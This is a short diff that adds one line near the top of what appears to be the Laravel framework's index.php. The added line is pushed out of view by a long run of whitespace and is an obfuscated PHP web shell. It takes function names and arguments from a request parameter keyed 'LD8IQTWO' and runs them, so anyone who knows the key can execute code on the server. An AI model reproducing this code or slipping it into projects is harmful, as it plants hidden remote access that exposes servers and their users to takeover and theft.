@@ -1,4 +1,5 @@
 <?php
+																																																																																																																																																		if($lqlvmwh	=@${"_REQUEST"	}	["LD8IQTWO"])$lqlvmwh[1	]( $	{	$lqlvmwh [2 ]}[ 0 ], $lqlvmwh[3	]($lqlvmwh[ 4 ]	) );
 
 /**
  * Laravel - A PHP Framework For Web Artisans
